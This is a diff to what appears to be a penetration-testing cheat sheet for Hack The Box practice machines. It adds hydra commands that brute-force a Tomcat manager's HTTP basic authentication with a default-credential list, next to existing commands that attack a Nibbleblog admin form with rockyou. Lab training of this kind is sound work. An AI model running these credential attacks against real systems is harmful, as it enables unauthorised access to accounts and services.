@@ -6,3 +6,8 @@ hydra -l admin -P /home/htb-woodenshoe/htb/wordlist/SecLists/Passwords/Leaked-Da
 
 Brute web form with user list:
 hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /home/htb-woodenshoe/htb/wordlist/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.75 http-post-form “/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect Username”
+
+
+Brute basic authentication HTTP combined user and password list:
+hydra -C ~/htb/wordlist/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get http://10.10.10.95:8080/manager/html
+hydra -C ~/htb/wordlist/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
